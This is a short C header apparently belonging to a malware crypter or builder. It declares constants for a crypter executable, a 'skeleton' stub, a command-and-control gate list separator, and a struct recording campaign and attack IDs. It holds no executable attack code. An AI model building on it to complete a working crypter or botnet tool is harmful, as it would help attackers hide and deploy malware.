//#include <Windows.h>

#include "..\CORE32\main.h"
#include "resource1.h"

#define SKEL_DATA_SEGMENT_NAME			"DAT"
#define GATELIST_SEPARATOR				"|"
#define SKEL_DATA_SIG					0xfffafffa

#define KPCOE_WORKING_DIRECTORY			"crypt"

#define KPCOE_CRYPTER					"KPCOE.exe"
#define KPCOE_CONFIG					"config.ini"
#define KPCOE_SKELETON					"skeleton.exe"


typedef struct skeleton_data {
	DWORD			signature;
	UINT			campaign_id;
	UINT			attack_id;
} SKELETON_DATA, *PSKELETON_DATA;

INT main(INT argc, PCHAR argv[]);



